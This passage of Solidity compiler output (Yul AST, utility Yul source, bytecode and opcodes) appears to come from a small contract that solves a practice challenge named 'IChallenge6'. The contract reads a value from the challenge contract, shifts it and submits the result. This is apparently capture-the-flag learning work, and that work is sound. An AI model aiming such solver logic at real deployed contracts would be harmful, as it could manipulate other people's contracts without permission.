8:18:14"},"nativeSrc":"2898:18:14","nodeType":"YulExpressionStatement","src":"2898:18:14"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nativeSrc":"2848:18:14","nodeType":"YulIdentifier","src":"2848:18:14"},{"arguments":[{"name":"length","nativeSrc":"2871:6:14","nodeType":"YulIdentifier","src":"2871:6:14"},{"kind":"number","nativeSrc":"2879:2:14","nodeType":"YulLiteral","src":"2879:2:14","type":"","value":"32"}],"functionName":{"name":"lt","nativeSrc":"2868:2:14","nodeType":"YulIdentifier","src":"2868:2:14"},"nativeSrc":"2868:14:14","nodeType":"YulFunctionCall","src":"2868:14:14"}],"functionName":{"name":"eq","nativeSrc":"2845:2:14","nodeType":"YulIdentifier","src":"2845:2:14"},"nativeSrc":"2845:38:14","nodeType":"YulFunctionCall","src":"2845:38:14"},"nativeSrc":"2842:84:14","nodeType":"YulIf","src":"2842:84:14"}]},"name":"extract_byte_array_length","nativeSrc":"2612:320:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nativeSrc":"2647:4:14","nodeType":"YulTypedName","src":"2647:4:14","type":""}],"returnVariables":[{"name":"length","nativeSrc":"2656:6:14","nodeType":"YulTypedName","src":"2656:6:14","type":""}],"src":"2612:320:14"},{"body":{"nativeSrc":"2978:35:14","nodeType":"YulBlock","src":"2978:35:14","statements":[{"nativeSrc":"2988:19:14","nodeType":"YulAssignment","src":"2988:19:14","value":{"arguments":[{"kind":"number","nativeSrc":"3004:2:14","nodeType":"YulLiteral","src":"3004:2:14","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"2998:5:14","nodeType":"YulIdentifier","src":"2998:5:14"},"nativeSrc":"2998:9:14","nodeType":"YulFunctionCall","src":"2998:9:14"},"variableNames":[{"name":"memPtr","nativeSrc":"2988:6:14","nodeType":"YulIdentifier","src":"2988:6:14"}]}]},"name":"allocate_unbounded","nativeSrc":"2938:75:14","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"2971:6:14","nodeType":"YulTypedName","src":"2971:6:14","type":""}],"src":"2938:75:14"},{"body":{"nativeSrc":"3108:28:14","nodeType":"YulBlock","src":"3108:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"3125:1:14","nodeType":"YulLiteral","src":"3125:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"3128:1:14","nodeType":"YulLiteral","src":"3128:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"3118:6:14","nodeType":"YulIdentifier","src":"3118:6:14"},"nativeSrc":"3118:12:14","nodeType":"YulFunctionCall","src":"3118:12:14"},"nativeSrc":"3118:12:14","nodeType":"YulExpressionStatement","src":"3118:12:14"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"3019:117:14","nodeType":"YulFunctionDefinition","src":"3019:117:14"},{"body":{"nativeSrc":"3231:28:14","nodeType":"YulBlock","src":"3231:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"3248:1:14","nodeType":"YulLiteral","src":"3248:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"3251:1:14","nodeType":"YulLiteral","src":"3251:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"3241:6:14","nodeType":"YulIdentifier","src":"3241:6:14"},"nativeSrc":"3241:12:14","nodeType":"YulFunctionCall","src":"3241:12:14"},"nativeSrc":"3241:12:14","nodeType":"YulExpressionStatement","src":"3241:12:14"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"3142:117:14","nodeType":"YulFunctionDefinition","src":"3142:117:14"},{"body":{"nativeSrc":"3310:32:14","nodeType":"YulBlock","src":"3310:32:14","statements":[{"nativeSrc":"3320:16:14","nodeType":"YulAssignment","src":"3320:16:14","value":{"name":"value","nativeSrc":"3331:5:14","nodeType":"YulIdentifier","src":"3331:5:14"},"variableNames":[{"name":"cleaned","nativeSrc":"3320:7:14","nodeType":"YulIdentifier","src":"3320:7:14"}]}]},"name":"cleanup_t_uint256","nativeSrc":"3265:77:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3292:5:14","nodeType":"YulTypedName","src":"3292:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"3302:7:14","nodeType":"YulTypedName","src":"3302:7:14","type":""}],"src":"3265:77:14"},{"body":{"nativeSrc":"3391:79:14","nodeType":"YulBlock","src":"3391:79:14","statements":[{"body":{"nativeSrc":"3448:16:14","nodeType":"YulBlock","src":"3448:16:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"3457:1:14","nodeType":"YulLiteral","src":"3457:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"3460:1:14","nodeType":"YulLiteral","src":"3460:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"3450:6:14","nodeType":"YulIdentifier","src":"3450:6:14"},"nativeSrc":"3450:12:14","nodeType":"YulFunctionCall","src":"3450:12:14"},"nativeSrc":"3450:12:14","nodeType":"YulExpressionStatement","src":"3450:12:14"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"3414:5:14","nodeType":"YulIdentifier","src":"3414:5:14"},{"arguments":[{"name":"value","nativeSrc":"3439:5:14","nodeType":"YulIdentifier","src":"3439:5:14"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"3421:17:14","nodeType":"YulIdentifier","src":"3421:17:14"},"nativeSrc":"3421:24:14","nodeType":"YulFunctionCall","src":"3421:24:14"}],"functionName":{"name":"eq","nativeSrc":"3411:2:14","nodeType":"YulIdentifier","src":"3411:2:14"},"nativeSrc":"3411:35:14","nodeType":"YulFunctionCall","src":"3411:35:14"}],"functionName":{"name":"iszero","nativeSrc":"3404:6:14","nodeType":"YulIdentifier","src":"3404:6:14"},"nativeSrc":"3404:43:14","nodeType":"YulFunctionCall","src":"3404:43:14"},"nativeSrc":"3401:63:14","nodeType":"YulIf","src":"3401:63:14"}]},"name":"validator_revert_t_uint256","nativeSrc":"3348:122:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3384:5:14","nodeType":"YulTypedName","src":"3384:5:14","type":""}],"src":"3348:122:14"},{"body":{"nativeSrc":"3539:80:14","nodeType":"YulBlock","src":"3539:80:14","statements":[{"nativeSrc":"3549:22:14","nodeType":"YulAssignment","src":"3549:22:14","value":{"arguments":[{"name":"offset","nativeSrc":"3564:6:14","nodeType":"YulIdentifier","src":"3564:6:14"}],"functionName":{"name":"mload","nativeSrc":"3558:5:14","nodeType":"YulIdentifier","src":"3558:5:14"},"nativeSrc":"3558:13:14","nodeType":"YulFunctionCall","src":"3558:13:14"},"variableNames":[{"name":"value","nativeSrc":"3549:5:14","nodeType":"YulIdentifier","src":"3549:5:14"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"3607:5:14","nodeType":"YulIdentifier","src":"3607:5:14"}],"functionName":{"name":"validator_revert_t_uint256","nativeSrc":"3580:26:14","nodeType":"YulIdentifier","src":"3580:26:14"},"nativeSrc":"3580:33:14","nodeType":"YulFunctionCall","src":"3580:33:14"},"nativeSrc":"3580:33:14","nodeType":"YulExpressionStatement","src":"3580:33:14"}]},"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"3476:143:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"3517:6:14","nodeType":"YulTypedName","src":"3517:6:14","type":""},{"name":"end","nativeSrc":"3525:3:14","nodeType":"YulTypedName","src":"3525:3:14","type":""}],"returnVariables":[{"name":"value","nativeSrc":"3533:5:14","nodeType":"YulTypedName","src":"3533:5:14","type":""}],"src":"3476:143:14"},{"body":{"nativeSrc":"3702:274:14","nodeType":"YulBlock","src":"3702:274:14","statements":[{"body":{"nativeSrc":"3748:83:14","nodeType":"YulBlock","src":"3748:83:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"3750:77:14","nodeType":"YulIdentifier","src":"3750:77:14"},"nativeSrc":"3750:79:14","nodeType":"YulFunctionCall","src":"3750:79:14"},"nativeSrc":"3750:79:14","nodeType":"YulExpressionStatement","src":"3750:79:14"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"3723:7:14","nodeType":"YulIdentifier","src":"3723:7:14"},{"name":"headStart","nativeSrc":"3732:9:14","nodeType":"YulIdentifier","src":"3732:9:14"}],"functionName":{"name":"sub","nativeSrc":"3719:3:14","nodeType":"YulIdentifier","src":"3719:3:14"},"nativeSrc":"3719:23:14","nodeType":"YulFunctionCall","src":"3719:23:14"},{"kind":"number","nativeSrc":"3744:2:14","nodeType":"YulLiteral","src":"3744:2:14","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"3715:3:14","nodeType":"YulIdentifier","src":"3715:3:14"},"nativeSrc":"3715:32:14","nodeType":"YulFunctionCall","src":"3715:32:14"},"nativeSrc":"3712:119:14","nodeType":"YulIf","src":"3712:119:14"},{"nativeSrc":"3841:128:14","nodeType":"YulBlock","src":"3841:128:14","statements":[{"nativeSrc":"3856:15:14","nodeType":"YulVariableDeclaration","src":"3856:15:14","value":{"kind":"number","nativeSrc":"3870:1:14","nodeType":"YulLiteral","src":"3870:1:14","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"3860:6:14","nodeType":"YulTypedName","src":"3860:6:14","type":""}]},{"nativeSrc":"3885:74:14","nodeType":"YulAssignment","src":"3885:74:14","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"3931:9:14","nodeType":"YulIdentifier","src":"3931:9:14"},{"name":"offset","nativeSrc":"3942:6:14","nodeType":"YulIdentifier","src":"3942:6:14"}],"functionName":{"name":"add","nativeSrc":"3927:3:14","nodeType":"YulIdentifier","src":"3927:3:14"},"nativeSrc":"3927:22:14","nodeType":"YulFunctionCall","src":"3927:22:14"},{"name":"dataEnd","nativeSrc":"3951:7:14","nodeType":"YulIdentifier","src":"3951:7:14"}],"functionName":{"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"3895:31:14","nodeType":"YulIdentifier","src":"3895:31:14"},"nativeSrc":"3895:64:14","nodeType":"YulFunctionCall","src":"3895:64:14"},"variableNames":[{"name":"value0","nativeSrc":"3885:6:14","nodeType":"YulIdentifier","src":"3885:6:14"}]}]}]},"name":"abi_decode_tuple_t_uint256_fromMemory","nativeSrc":"3625:351:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"3672:9:14","nodeType":"YulTypedName","src":"3672:9:14","type":""},{"name":"dataEnd","nativeSrc":"3683:7:14","nodeType":"YulTypedName","src":"3683:7:14","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"3695:6:14","nodeType":"YulTypedName","src":"3695:6:14","type":""}],"src":"3625:351:14"},{"body":{"nativeSrc":"4047:53:14","nodeType":"YulBlock","src":"4047:53:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"4064:3:14","nodeType":"YulIdentifier","src":"4064:3:14"},{"arguments":[{"name":"value","nativeSrc":"4087:5:14","nodeType":"YulIdentifier","src":"4087:5:14"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"4069:17:14","nodeType":"YulIdentifier","src":"4069:17:14"},"nativeSrc":"4069:24:14","nodeType":"YulFunctionCall","src":"4069:24:14"}],"functionName":{"name":"mstore","nativeSrc":"4057:6:14","nodeType":"YulIdentifier","src":"4057:6:14"},"nativeSrc":"4057:37:14","nodeType":"YulFunctionCall","src":"4057:37:14"},"nativeSrc":"4057:37:14","nodeType":"YulExpressionStatement","src":"4057:37:14"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"3982:118:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"4035:5:14","nodeType":"YulTypedName","src":"4035:5:14","type":""},{"name":"pos","nativeSrc":"4042:3:14","nodeType":"YulTypedName","src":"4042:3:14","type":""}],"src":"3982:118:14"},{"body":{"nativeSrc":"4204:124:14","nodeType":"YulBlock","src":"4204:124:14","statements":[{"nativeSrc":"4214:26:14","nodeType":"YulAssignment","src":"4214:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"4226:9:14","nodeType":"YulIdentifier","src":"4226:9:14"},{"kind":"number","nativeSrc":"4237:2:14","nodeType":"YulLiteral","src":"4237:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"4222:3:14","nodeType":"YulIdentifier","src":"4222:3:14"},"nativeSrc":"4222:18:14","nodeType":"YulFunctionCall","src":"4222:18:14"},"variableNames":[{"name":"tail","nativeSrc":"4214:4:14","nodeType":"YulIdentifier","src":"4214:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"4294:6:14","nodeType":"YulIdentifier","src":"4294:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"4307:9:14","nodeType":"YulIdentifier","src":"4307:9:14"},{"kind":"number","nativeSrc":"4318:1:14","nodeType":"YulLiteral","src":"4318:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"4303:3:14","nodeType":"YulIdentifier","src":"4303:3:14"},"nativeSrc":"4303:17:14","nodeType":"YulFunctionCall","src":"4303:17:14"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"4250:43:14","nodeType":"YulIdentifier","src":"4250:43:14"},"nativeSrc":"4250:71:14","nodeType":"YulFunctionCall","src":"4250:71:14"},"nativeSrc":"4250:71:14","nodeType":"YulExpressionStatement","src":"4250:71:14"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nativeSrc":"4106:222:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"4176:9:14","nodeType":"YulTypedName","src":"4176:9:14","type":""},{"name":"value0","nativeSrc":"4188:6:14","nodeType":"YulTypedName","src":"4188:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"4199:4:14","nodeType":"YulTypedName","src":"4199:4:14","type":""}],"src":"4106:222:14"}]},"contents":"{\n\n    function array_length_t_string_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function copy_memory_to_memory_with_cleanup(src, dst, length) {\n\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        mstore(add(dst, length), 0)\n\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n    function abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_string_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory_with_cleanup(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value0,  tail)\n\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_uint160_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))\n    }\n\n    function convert_t_uint160_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_IChallenge6_$5824_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_address(value)\n    }\n\n    function abi_encode_t_contract$_IChallenge6_$5824_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_IChallenge6_$5824_to_t_address(value))\n    }\n\n    function abi_encode_tuple_t_contract$_IChallenge6_$5824__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_IChallenge6_$5824_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n","id":14,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"608060405234801561001057600080fd5b50600436106100415760003560e01c806306fdde03146100465780632be0956114610064578063d2ef73981461006e575b600080fd5b61004e61008c565b60405161005b91906102f4565b60405180910390f35b61006c61011a565b005b610076610240565b6040516100839190610395565b60405180910390f35b60018054610099906103df565b80601f01602080910402602001604051908101604052809291908181526020018280546100c5906103df565b80156101125780601f106100e757610100808354040283529160200191610112565b820191906000526020600020905b8154815290600101906020018083116100f557829003601f168201915b505050505081565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166306661abd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610188573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101ac919061044b565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323df6bd6600883901b6040518263ffffffff1660e01b815260040161020b9190610487565b600060405180830381600087803b15801561022557600080fd5b505af1158015610239573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600081519050919050565b600082825260208201905092915050565b60005b8381101561029e578082015181840152602081019050610283565b60008484015250505050565b6000601f19601f8301169050919050565b60006102c682610264565b6102d0818561026f565b93506102e0818560208601610280565b6102e9816102aa565b840191505092915050565b6000602082019050818103600083015261030e81846102bb565b905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061035b61035661035184610316565b610336565b610316565b9050919050565b600061036d82610340565b9050919050565b600061037f82610362565b9050919050565b61038f81610374565b82525050565b60006020820190506103aa6000830184610386565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806103f757607f821691505b60208210810361040a576104096103b0565b5b50919050565b600080fd5b6000819050919050565b61042881610415565b811461043357600080fd5b50565b6000815190506104458161041f565b92915050565b60006020828403121561046157610460610410565b5b600061046f84828501610436565b91505092915050565b61048181610415565b82525050565b600060208201905061049c6000830184610478565b9291505056fea26469706673582212208818aaa7c5f70c7f703fe2e0924d9053ad8a8888c622e709885ac5a6a8acfb4e64736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x2BE09561 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0xD2EF7398 EQ PUSH2 0x6E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x8C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x2F4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x6C PUSH2 0x11A JUMP JUMPDEST STOP JUMPDEST PUSH2 0x76 PUSH2 0x240 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x83 SWAP2 SWAP1 PUSH2 0x395 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH2 0x99 SWAP1 PUSH2 0x3DF JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0xC5 SWAP1 PUSH2 0x3DF JUMP JUMPDEST DUP1 ISZERO PUSH2 0x112 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0xE7 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x112 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0xF5 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6661ABD PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x188 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1AC SWAP2 SWAP1 PUSH2 0x44B JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23DF6BD6 PUSH1 0x8 DUP4 SWAP1 SHL PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x20B SWAP2 SWAP1 PUSH2 0x487 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x225 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x239 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x29E JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x283 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2C6 DUP3 PUSH2 0x264 JUMP JUMPDEST PUSH2 0x2D0 DUP2 DUP6 PUSH2 0x26F JUMP JUMPDEST SWAP4 POP PUSH2 0x2E0 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x280 JUMP JUMPDEST PUSH2 0x2E9 DUP2 PUSH2 0x2AA JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x30E DUP2 DUP5 PUSH2 0x2BB JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x35B PUSH2 0x356 PUSH2 0x351 DUP5 PUSH2 0x316 JUMP JUMPDEST PUSH2 0x336 JUMP JUMPDEST PUSH2 0x316 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x36D DUP3 PUSH2 0x340 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x37F DUP3 PUSH2 0x362 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x38F DUP2 PUSH2 0x374 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3AA PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x386 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x3F7 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x40A JUMPI PUSH2 0x409 PUSH2 0x3B0 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x428 DUP2 PUSH2 0x415 JUMP JUMPDEST DUP2 EQ PUSH2 0x433 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x445 DUP2 PUSH2 0x41F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x461 JUMPI PUSH2 0x460 PUSH2 0x410 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x46F DUP5 DUP3 DUP6 ADD PUSH2 0x436 JUMP JUMPDEST SWAP2 